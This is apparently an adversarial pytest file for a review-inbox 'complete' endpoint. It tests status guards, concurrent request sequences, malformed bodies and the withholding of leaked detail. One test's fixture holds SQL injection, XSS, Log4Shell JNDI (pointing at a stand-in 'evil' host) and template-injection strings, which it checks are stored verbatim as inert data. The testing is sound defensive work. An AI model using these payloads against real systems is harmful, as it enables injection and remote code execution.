"""ADVERSARIAL: `POST /inbox/{id}/complete` against everything a reviewer, a stale
browser tab, or a hostile client can send it.

The builder's `test_fail_to_review_inbox.py` pins the intended path (a good form lands, a
short form declines, a non-array 422s, an ordinary review item is refused). This file
attacks the same surface from the other side, because the completion route is the ONE
place in the learning loop where a human writes into a candidate's payload and a
validation re-runs over what they wrote:

  * **the status guard is the whole security story.** `complete` may only ever act on
    `needs_parameterization` — otherwise it is a second, unvalidated write path into an
    ordinary candidate's payload — so every OTHER lifecycle state is tested explicitly
    rather than by the one representative the builder chose;
  * **sequences, not just single calls.** Two completes, complete-then-reject,
    reject-then-complete: the review surface is a queue several humans share, and "the
    row moved under me" is the normal case, not the edge one;
  * **content is untrusted.** Entries carrying SQL, script tags, control characters and
    2000-deep nesting must produce a validation RESULT, never a traceback and never an
    executed anything.

Nothing here asserts an error message text: the contract is the status code and the
persisted state.
"""

from __future__ import annotations

from dataclasses import replace

import pytest
from fastapi.testclient import TestClient

from data_agent.catalog.loader import build_sqlglot_schema_from_catalog
from data_agent.learning.candidate.memory_candidate_store import InMemoryCandidateStore
from data_agent.learning.candidate.models import (
    CandidateStatus,
    build_declined_envelope,
    mint_review_candidate_id,
)
from data_agent.learning.extractor.models import Decline
from data_agent.learning.generalize import GeneralizeStage
from data_agent.learning.inbox import ParameterizationCompleter, ReviewInbox
from data_agent.learning.inbox.service import create_inbox_app
from data_agent.learning.leakage import LeakageGateStage
from data_agent.learning.writer import WriterStage
from tests._catalog_fixture import fixture_catalog

from ..extractor.helpers import (
    PAYROLL_SQL,
    blueprint_raw,
    make_summary,
    make_tool_call,
    param_slot,
    payroll_parameterization,
)

TOKEN = "reviewer-secret"
AUTH = {"X-Reviewer-Token": TOKEN}
CID = mint_review_candidate_id("hash-ratio", 0)

_CATALOG = fixture_catalog()
# The live shape: every literal predicate classified except `region`.
_MISSING_REGION = payroll_parameterization()[:3]
_HUMAN_ENTRIES = [
    param_slot(
        "region", slot_type="entity", required=False, optional_pattern="TRUE", value="NA"
    )
]
_UNCOVERED = blueprint_raw(parameterization=_MISSING_REGION, source_refs=("tc1",))


@pytest.fixture
def enabled(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("REVIEW_INBOX_ENABLED", "1")
    monkeypatch.setenv("REVIEWER_TOKEN", TOKEN)


def _summary():
    return make_summary(
        tool_calls=(make_tool_call(ref="tc1", sql=PAYROLL_SQL),), content_hash="hash-ratio"
    )


def _declined(*, scan_result: str | None = "pass", raw: dict | None = None):
    env = build_declined_envelope(
        Decline(
            type="blueprint",
            reason="totality_violation",
            detail="region = 'NA' has no entry",
            correctable=True,
            corrections_attempted=2,
            correction_history=("first correction",),
            raw_payload=raw if raw is not None else _UNCOVERED,
        ),
        _summary(),
        candidate_id=CID,
    )
    if scan_result is None:
        return env
    return replace(
        env,
        entity_scan={
            "result": scan_result,
            "hits": [],
            "scanned_fields": ["intent"],
            "scanner": "regex+ner",
        },
    )


def _stages(store):
    """Generalize → leakage → writer: the blueprint half of the frozen order (dedup needs
    an embedder + a corpus and is exercised elsewhere). What matters here is that the
    completed candidate goes through the ROUTER rather than around it."""
    return (
        GeneralizeStage(catalog_schema=build_sqlglot_schema_from_catalog(_CATALOG)),
        LeakageGateStage(candidate_store=store),
        WriterStage(sampler=lambda env: False),
    )


async def _client(*, env=None, with_stages: bool = True, with_completer: bool = True):
    store = InMemoryCandidateStore()
    await store.put(env if env is not None else _declined())
    completer = (
        ParameterizationCompleter(
            store=store,
            known_rules=frozenset(),
            rule_index=None,
            stages=_stages(store) if with_stages else (),
        )
        if with_completer
        else None
    )
    inbox = ReviewInbox(store, completer=completer)
    return TestClient(create_inbox_app(inbox=inbox, write_plane="offline")), store


# --- the status guard, over the WHOLE lifecycle ------------------------------------------


@pytest.mark.parametrize(
    "status",
    [
        CandidateStatus.EXTRACTED,
        CandidateStatus.CANDIDATE,
        CandidateStatus.IN_REVIEW,
        CandidateStatus.VALIDATED,
        CandidateStatus.QUARANTINED,
        CandidateStatus.REJECTED,
        CandidateStatus.RETIRED,
        CandidateStatus.PROMOTED,
    ],
)
async def test_completion_is_refused_in_every_other_status(enabled, status: str) -> None:
    """One `complete` per lifecycle state, and every one is a 409.

    The builder pinned `in_review` — the state where the crossing would matter most — and
    that is the right single test. This is the exhaustive version, because the guard is an
    equality against ONE status and the cheap way to break it later is to widen it to a
    set "while we are here". Note the decline block is left ON the envelope: the guard
    must key on the STATUS, not on the presence of a form."""
    client, store = await _client(env=replace(_declined(), status=status))
    resp = client.post(f"/inbox/{CID}/complete", json={"entries": _HUMAN_ENTRIES}, headers=AUTH)
    assert resp.status_code == 409, resp.text
    # And nothing was written: the payload is untouched by a refused completion.
    assert len((await store.get(CID)).payload["parameterization"]) == 3


async def test_completing_an_unknown_id_is_404_not_a_500(enabled) -> None:
    client, _ = await _client()
    resp = client.post(
        "/inbox/candidate::nobody::review-0/complete",
        json={"entries": _HUMAN_ENTRIES},
        headers=AUTH,
    )
    assert resp.status_code == 404, resp.text


async def test_the_status_guard_runs_before_the_completer_is_consulted(enabled) -> None:
    """Order matters for the 503: a deployment with NO validation plane must still answer
    "wrong status" for a row that is not a form, rather than "unavailable" — otherwise the
    absence of a completer would mask an illegal transition."""
    client, _ = await _client(
        env=replace(_declined(), status=CandidateStatus.IN_REVIEW), with_completer=False
    )
    resp = client.post(f"/inbox/{CID}/complete", json={"entries": []}, headers=AUTH)
    assert resp.status_code == 409, resp.text


@pytest.mark.parametrize("action", ["approve", "retract", "verify", "promote"])
async def test_no_other_action_moves_a_form_out_of_the_queue(enabled, action: str) -> None:
    """The inverse guard. `complete` and `reject` are the only two transitions out of
    `needs_parameterization`; every other verb must refuse, or a form could be validated,
    promoted or retired without ever having been filled in."""
    client, store = await _client()
    resp = client.post(f"/inbox/{CID}/{action}", headers=AUTH)
    assert resp.status_code != 200, resp.text
    assert (await store.get(CID)).status == CandidateStatus.NEEDS_PARAMETERIZATION


# --- sequences: the queue several humans share --------------------------------------------


async def test_a_second_completion_of_a_completed_row_is_refused(enabled) -> None:
    """IDEMPOTENCY, stated as a guard rather than as a retry. The first completion moves
    the row out of `needs_parameterization`; the second — a double-click, a stale tab, a
    redelivered request — finds a status that is no longer a form and is refused, so a
    reviewer's second submission can never re-write the payload of a candidate that is
    already awaiting judgement."""
    client, store = await _client()

    first = client.post(f"/inbox/{CID}/complete", json={"entries": _HUMAN_ENTRIES}, headers=AUTH)
    assert first.status_code == 200 and first.json()["outcome"] == "completed", first.text
    landed = (await store.get(CID)).status
    assert landed != CandidateStatus.NEEDS_PARAMETERIZATION

    second = client.post(f"/inbox/{CID}/complete", json={"entries": _HUMAN_ENTRIES}, headers=AUTH)
    assert second.status_code == 409, second.text
    assert (await store.get(CID)).status == landed


async def test_two_incomplete_attempts_accumulate_rather_than_conflict(enabled) -> None:
    """The other repeat: a form that STILL does not validate stays a form, so a second
    attempt is legal and starts from the reviewer's previous work. This is the append
    contract's whole purpose — the alternative makes every round of a two-round fix retype
    the first one — and it is also why the row must not be locked by a failed attempt."""
    client, store = await _client()
    junk = [{"locator": {"table": "payroll.payroll_fact", "column": "region"}}]

    first = client.post(f"/inbox/{CID}/complete", json={"entries": junk}, headers=AUTH)
    assert first.status_code == 200 and first.json()["outcome"] == "declined", first.text
    assert len((await store.get(CID)).payload["parameterization"]) == 4

    second = client.post(f"/inbox/{CID}/complete", json={"entries": junk}, headers=AUTH)
    assert second.status_code == 200 and second.json()["outcome"] == "declined"
    assert len((await store.get(CID)).payload["parameterization"]) == 5
    assert (await store.get(CID)).status == CandidateStatus.NEEDS_PARAMETERIZATION


async def test_reject_then_complete_is_refused(enabled) -> None:
    """A reviewer who decided the form has no honest answer clears the row. A completion
    arriving afterwards — from another tab, another person — must not resurrect it: a
    rejected candidate is a NEGATIVE training signal (D29) and re-validating one would
    quietly re-enter it into the pipeline it was removed from."""
    client, store = await _client()

    assert client.post(f"/inbox/{CID}/reject", headers=AUTH).status_code == 200
    assert (await store.get(CID)).status == CandidateStatus.REJECTED

    resp = client.post(f"/inbox/{CID}/complete", json={"entries": _HUMAN_ENTRIES}, headers=AUTH)
    assert resp.status_code == 409, resp.text
    assert (await store.get(CID)).status == CandidateStatus.REJECTED


async def test_complete_then_reject_follows_the_ordinary_review_rules(enabled) -> None:
    """After a completion the row is an ORDINARY candidate, and reject stops being a
    fail-to-review affordance and becomes the normal `in_review` one. Pinned because the
    reject guard was widened by this slice: the widening must not survive the transition
    out of `needs_parameterization`."""
    client, store = await _client()
    assert client.post(
        f"/inbox/{CID}/complete", json={"entries": _HUMAN_ENTRIES}, headers=AUTH
    ).json()["outcome"] == "completed"
    landed = (await store.get(CID)).status

    resp = client.post(f"/inbox/{CID}/reject", headers=AUTH)
    if landed == CandidateStatus.IN_REVIEW:
        assert resp.status_code == 200
        assert (await store.get(CID)).status == CandidateStatus.REJECTED
    else:  # auto-landed — reject is an in_review-only transition
        assert resp.status_code == 409


# --- hostile bodies -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "entries",
    [
        "not a list",
        42,
        {"locator": {}, "role": "inline"},
        None,
        ["a string"],
        [None],
        [[{"locator": {}}]],
        [42],
        [True],
    ],
)
async def test_entries_that_are_not_an_array_of_objects_are_422(enabled, entries) -> None:
    """422 at the boundary, not a decline: a body that is not a parameterization array is
    not a failed attempt at one, and answering 200-declined would tell the reviewer their
    ENTRIES were wrong when their REQUEST was."""
    client, store = await _client()
    resp = client.post(f"/inbox/{CID}/complete", json={"entries": entries}, headers=AUTH)
    assert resp.status_code == 422, resp.text
    assert len((await store.get(CID)).payload["parameterization"]) == 3


async def test_a_missing_body_is_an_empty_attempt_not_an_error(enabled) -> None:
    """No body at all is a well-formed request with nothing in it — the same as
    `{"entries": []}`. It declines (the form is unchanged and still short), which is the
    honest answer, and it must not 500 on the absent model."""
    client, store = await _client()
    resp = client.post(f"/inbox/{CID}/complete", headers=AUTH)
    assert resp.status_code == 200, resp.text
    assert resp.json()["outcome"] == "declined"
    assert (await store.get(CID)).status == CandidateStatus.NEEDS_PARAMETERIZATION


async def test_unknown_body_keys_are_ignored(enabled) -> None:
    """A client sending fields the contract does not have gets them dropped, not
    honoured — in particular nothing that looks like a status or a bypass."""
    client, store = await _client()
    resp = client.post(
        f"/inbox/{CID}/complete",
        json={
            "entries": _HUMAN_ENTRIES,
            "status": "validated",
            "skip_validation": True,
            "entity_scan": {"result": "pass"},
        },
        headers=AUTH,
    )
    assert resp.status_code == 200, resp.text
    env = await store.get(CID)
    assert env.status != CandidateStatus.VALIDATED
    # The scan was re-settled by the GATE, not by the request body.
    assert env.entity_scan["scanner"] == "regex+ner"


async def test_injected_sql_and_script_are_data_all_the_way_down(enabled) -> None:
    """Entries carrying a DROP statement, a script tag, a template expression and control
    characters. The contract is that they are treated as VALUES: the request completes as
    a validation result, the strings survive verbatim in the stored payload (nothing
    executed, nothing evaluated, nothing rendered), and the row stays a form."""
    poison = [
        {
            "locator": {
                "table": "payroll.payroll_fact'; DROP TABLE payroll_fact; --",
                "column": "<script>alert('xss')</script>",
                "value": "${jndi:ldap://evil/x}\x00\r\n",
            },
            "role": "inline",
            "why": "{{7*7}} <img src=x onerror=alert(1)>",
        }
    ]
    client, store = await _client()

    resp = client.post(f"/inbox/{CID}/complete", json={"entries": poison}, headers=AUTH)

    assert resp.status_code == 200, resp.text
    assert resp.json()["outcome"] == "declined"
    stored = (await store.get(CID)).payload["parameterization"]
    assert stored[-1]["locator"]["column"] == "<script>alert('xss')</script>"
    assert (await store.get(CID)).status == CandidateStatus.NEEDS_PARAMETERIZATION


async def test_a_deeply_nested_entry_declines_rather_than_recursing(enabled) -> None:
    """2000 levels of nesting inside one entry. The readers are flat, so this is a
    `malformed_candidate` — a RESULT the reviewer can read — rather than a
    `RecursionError` 500."""
    node: object = {
        "locator": {"table": "payroll.payroll_fact", "column": "region", "value": "NA"},
        "role": "inline",
        "why": "bottom",
    }
    for _ in range(2000):
        node = {"nested": node}
    client, store = await _client()

    resp = client.post(f"/inbox/{CID}/complete", json={"entries": [node]}, headers=AUTH)

    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["outcome"] == "declined"
    assert body["decline"]["reason"] == "malformed_candidate"
    assert (await store.get(CID)).status == CandidateStatus.NEEDS_PARAMETERIZATION


async def test_a_very_large_entry_array_is_a_result_not_a_crash(enabled) -> None:
    """Five thousand entries. There is no size bound on this body today (the reviewer is
    authenticated and the service is internal); what is pinned is that the absence of one
    is survivable — the request completes with a validation verdict."""
    client, _ = await _client()
    entries = [
        {
            "locator": {"table": "payroll.payroll_fact", "column": f"c{i}", "value": "x"},
            "role": "inline",
            "why": "bulk",
        }
        for i in range(5000)
    ]
    resp = client.post(f"/inbox/{CID}/complete", json={"entries": entries}, headers=AUTH)
    assert resp.status_code == 200, resp.text
    assert resp.json()["outcome"] == "declined"


# --- replace=true, the destructive mode ------------------------------------------------------


async def test_replace_with_an_empty_array_wipes_the_form_and_declines(enabled) -> None:
    """The property `completion.py` claims for replace mode, tested from the destructive
    side: a reviewer who deletes entries they should not have gets a DECLINE naming every
    now-uncovered predicate, not a silently dropped filter. The wiped array is persisted
    (it is their work, and the next attempt starts from it) but the candidate cannot
    land."""
    client, store = await _client()

    resp = client.post(
        f"/inbox/{CID}/complete", json={"entries": [], "replace": True}, headers=AUTH
    )

    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["outcome"] == "declined"
    assert body["decline"]["reason"] == "totality_violation"
    assert "4 literal predicate(s)" in body["decline"]["detail"]
    env = await store.get(CID)
    assert env.payload["parameterization"] == []
    assert env.status == CandidateStatus.NEEDS_PARAMETERIZATION


async def test_replace_with_junk_declines_and_never_partially_applies(enabled) -> None:
    """Replace is all-or-nothing at the payload level and validated as a whole. Junk in,
    decline out — and the stored array is exactly what was sent, so what the reviewer sees
    next is what they did."""
    client, store = await _client()
    junk = [{"role": "wat"}, {"locator": "not an object", "role": "inline"}]

    resp = client.post(
        f"/inbox/{CID}/complete", json={"entries": junk, "replace": True}, headers=AUTH
    )

    assert resp.status_code == 200, resp.text
    assert resp.json()["outcome"] == "declined"
    assert (await store.get(CID)).payload["parameterization"] == junk


# --- the leakage side door, on the completion RESPONSE ------------------------------------------


async def test_a_fresh_decline_on_a_quarantined_row_is_withheld_in_the_response(
    enabled,
) -> None:
    """Spec §3, on the surface the list tests do not cover. The completion RESPONSE
    carries the fresh decline detail, and it must obey the SAME withholding rule as the
    row: on a candidate whose leakage verdict is a quarantine, the detail — a sentence
    full of the session's own literals — must not cross to the browser just because the
    reviewer typed something.

    The candidate here carries a REAL entity in its intent rather than a hand-stamped
    verdict, and that is now load-bearing: since the still-declined path RE-SCANS the
    merged payload (a reviewer types entity values into locators for a living), the
    verdict that gates this response is the one settled about the text being stored, not
    a stale one about text that may no longer be there. A synthetic quarantine over an
    entity-free payload would now correctly re-settle to `pass` and prove nothing."""
    leaky = blueprint_raw(
        intent="earnings for Jane Doe in the EMEA region",
        parameterization=_MISSING_REGION,
        source_refs=("tc1",),
    )
    client, _ = await _client(env=_declined(scan_result="quarantine", raw=leaky))

    resp = client.post(f"/inbox/{CID}/complete", json={"entries": []}, headers=AUTH)

    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["outcome"] == "declined"
    assert body["decline"]["detail"] == ""
    assert body["decline"]["detail_withheld"] is True
    # Not merely blanked in the projected field — absent from the RESPONSE.
    assert "region = 'NA'" not in resp.text
    assert "payroll_fact" not in resp.text


async def test_an_unsettled_scan_withholds_the_completion_response_too(enabled) -> None:
    """The stronger case: NO leakage stage is wired in this deployment, so nobody scanned
    the row when it was persisted and nobody scans it now. The response fails closed
    exactly as the listing does.

    `with_stages=False` is the whole scenario, not a convenience: with a gate wired the
    still-declined path re-scans and the row stops being unscanned, which is the fix
    working rather than the case under test."""
    client, _ = await _client(env=_declined(scan_result=None), with_stages=False)
    resp = client.post(f"/inbox/{CID}/complete", json={"entries": []}, headers=AUTH)
    assert resp.json()["decline"]["detail_withheld"] is True
    assert "region = 'NA'" not in resp.text


async def test_a_completed_row_carries_no_decline_in_its_response(enabled) -> None:
    """The form is filled in, so there is no form left to describe. A block left on the
    response would keep the UI rendering an outstanding task for a candidate that has
    moved on."""
    client, _ = await _client()
    resp = client.post(f"/inbox/{CID}/complete", json={"entries": _HUMAN_ENTRIES}, headers=AUTH)
    body = resp.json()
    assert body["outcome"] == "completed"
    assert body["decline"] is None


# --- what a still-declined completion leaves behind -----------------------------------------------


async def test_a_still_declined_completion_re_settles_the_scan_over_what_it_stores(
    enabled,
) -> None:
    """UPDATED, deliberately, when the still-declined path started RE-SCANNING.

    QA pinned the previous behaviour here — the merged payload was persisted under the
    verdict settled about the PREVIOUS payload, so between two attempts the row held text
    no scanner had seen under a `pass` stamp. It was bounded and it was documented; it was
    also a stamp inherited from content that was no longer there, on the one field the
    wire projection consults before showing a sentence full of session literals to a
    browser. So the rule the success path obeys ("changed payload ⇒ re-scan") now governs
    this path too.

    What is asserted is that the stored verdict is a MEASUREMENT of the stored payload: a
    row whose scanned surface carries an entity comes back `quarantine` even though the
    stale stamp said `pass`, and the wire withholds on the strength of the fresh verdict.
    """
    leaky = blueprint_raw(
        intent="earnings for Jane Doe in the EMEA region",
        parameterization=_MISSING_REGION,
        source_refs=("tc1",),
    )
    # The stale stamp is a clean pass — inherited, and wrong about this payload.
    client, store = await _client(env=_declined(scan_result="pass", raw=leaky))

    resp = client.post(f"/inbox/{CID}/complete", json={"entries": []}, headers=AUTH)

    assert resp.json()["outcome"] == "declined", resp.text
    parked = await store.get(CID)
    assert parked.status == CandidateStatus.NEEDS_PARAMETERIZATION
    # Re-measured, not inherited.
    assert parked.entity_scan["result"] == "quarantine"
    assert parked.entity_scan["scanner"] == "regex+ner"
    # ...and the fresh verdict is what the wire gates on, in the same request.
    assert resp.json()["decline"]["detail_withheld"] is True


async def test_an_inline_literal_is_scanned_but_a_slot_one_is_not(enabled) -> None:
    """⚠ THIS TEST PREDICTED ITS OWN FLIP AND HAS NOW FLIPPED. It used to say the gate scans no
    part of `parameterization`, and ended: "if the scanned surfaces ever grow to include
    parameterization, this test is the one that should start failing." They have grown, by
    exactly one field, and the reason is the correspondence the old rule missed.

    The rule is not "scan the entries" — it is scan WHAT SURVIVES INTO THE TEMPLATE. On the
    success path the gate reads `generalization.sql_template`, where every `slot` literal has
    already become a token and only the `inline` ones remain, because those are the values that
    ride into the landed global artifact verbatim. A DECLINED row has no template, so that
    surface does not exist and the old re-scan settled `pass` having read none of them.

    An `inline` entry is a DECLARATION that a value stays frozen for ever, and it is knowable
    from the payload before any template exists. So a declined row now gets the same verdict it
    will get a round later when it completes, rather than one that differs by an accident of
    which stages happened to have run.

    THE OTHER HALF IS WHY THE OLD RULE EXISTED, and it still holds: a SLOT literal is not
    scanned. `department = '0420'` is the caller's question, it becomes a token, it never reaches
    a global store — and scanning it would quarantine every candidate that ever filtered on a
    department, withholding the decline detail and locking the assistant on the queue whose
    whole purpose is helping with that row.
    """
    client, store = await _client()
    entity_in_a_locator = [
        {
            "locator": {"table": "payroll.payroll_fact", "column": "region", "value": "EMEA"},
            "role": "inline",
            "why": "the EMEA rollout is what this report is for",
        }
    ]

    resp = client.post(
        f"/inbox/{CID}/complete", json={"entries": entity_in_a_locator}, headers=AUTH
    )

    assert resp.json()["outcome"] == "declined", resp.text
    parked = await store.get(CID)
    assert parked.payload["parameterization"][-1]["locator"]["value"] == "EMEA"
    # FROZEN ⇒ SCANNED ⇒ caught, one round earlier than the template would have caught it.
    assert parked.entity_scan["result"] == "quarantine"
    scanned = parked.entity_scan["scanned_fields"]
    assert any(f.endswith(".locator.value") for f in scanned), scanned

    # ...and the complement: the SAME value as a SLOT is not a scanned surface at all.
    slot_entry = [
        {
            "locator": {"table": "payroll.payroll_fact", "column": "region", "value": "EMEA"},
            "role": "slot",
            "slot": {
                "name": "region",
                "type": "entity",
                "binds_to": "payroll.payroll_fact.region",
                "required": True,
            },
        }
    ]
    # `replace` so the inline entry above is GONE — appending would leave it in the payload and
    # the assertion would be measuring the first half of this test over again.
    client.post(
        f"/inbox/{CID}/complete",
        json={"entries": slot_entry, "replace": True},
        headers=AUTH,
    )
    reparked = await store.get(CID)
    assert not any(
        f.endswith(".locator.value") for f in reparked.entity_scan["scanned_fields"]
    )
    # ...and it is going nowhere on that pass: approve is in_review-only.
    assert client.post(f"/inbox/{CID}/approve", headers=AUTH).status_code == 409

    # The exit re-scans too. A successful completion re-runs the gate over the CHANGED
    # payload, so no verdict ever survives a landing without having been measured.
    ok = client.post(
        f"/inbox/{CID}/complete",
        json={"entries": payroll_parameterization(), "replace": True},
        headers=AUTH,
    )
    assert ok.json()["outcome"] == "completed", ok.text
    landed = await store.get(CID)
    assert landed.entity_scan["result"] != "pending"
    assert landed.entity_scan["scanner"] == "regex+ner"


async def test_a_completion_with_no_pipeline_wired_is_flagged_by_its_own_state(
    enabled,
) -> None:
    """The degraded offline wiring `completion.py` warns about, pinned as a state rather
    than as a log line: the candidate re-validates and is persisted at `extracted` with an
    UNSETTLED scan — which every approve guard refuses and which the inbox does not list.
    A deployment that means to land completions must wire the stages."""
    client, store = await _client(with_stages=False)

    resp = client.post(f"/inbox/{CID}/complete", json={"entries": _HUMAN_ENTRIES}, headers=AUTH)

    assert resp.json()["outcome"] == "completed", resp.text
    env = await store.get(CID)
    assert env.status == CandidateStatus.EXTRACTED
    assert env.entity_scan["result"] == "pending"
    assert "generalization" not in env.payload
    # It has left every listable surface — invisible, not landed.
    for status in ("in_review", "needs_parameterization", "rejected", "validated"):
        listed = client.get("/inbox", params={"status": status}, headers=AUTH).json()["items"]
        assert listed == []


# --- the archive surface a rejected form lands on --------------------------------------------------


async def test_a_rejected_form_keeps_its_withholding_rule_in_the_archive(enabled) -> None:
    """Reject does not clear the decline block, so a rejected fail-to-review row shows up
    in the durable archive still carrying one — a second wire surface for the same text.
    The gate travels with the row: an uncleared scan withholds there too."""
    client, _ = await _client(env=_declined(scan_result="quarantine"))
    assert client.post(f"/inbox/{CID}/reject", headers=AUTH).status_code == 200

    resp = client.get("/inbox", params={"status": "rejected"}, headers=AUTH)

    items = resp.json()["items"]
    assert len(items) == 1
    assert items[0]["status"] == CandidateStatus.REJECTED
    assert items[0]["decline"]["detail_withheld"] is True
    assert "region = 'NA'" not in resp.text
